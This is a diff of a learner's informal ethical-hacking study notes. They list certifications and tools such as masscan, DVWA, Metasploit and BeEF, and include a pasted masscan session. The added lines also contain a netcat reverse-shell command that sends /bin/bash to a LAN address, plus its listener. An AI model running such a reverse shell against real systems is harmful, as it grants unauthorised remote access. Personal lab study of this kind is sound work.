@@ -378,7 +378,25 @@ netacad ethicalhacking course free
 scapy adv networking
 
 
-4
+pnpt pjpt praticial certifcation 
+
+nc -e /bin/bash 192.168.0. 4444
+for another pc command for listen 
+nc -lvnp
+
+foxyproxy kali extension
+massscan  linux
+┌──(midhun㉿kali)-[~]
+└─$ sudo masscan 192.168.0.151 -p80
+[sudo] password for midhun: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2026-03-15 10:30:23 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [1 port/host]
+apt dvwa to install metaspoliton linux
+nc command (netcat on kali)
+
+beef -xss
+
      
 
 
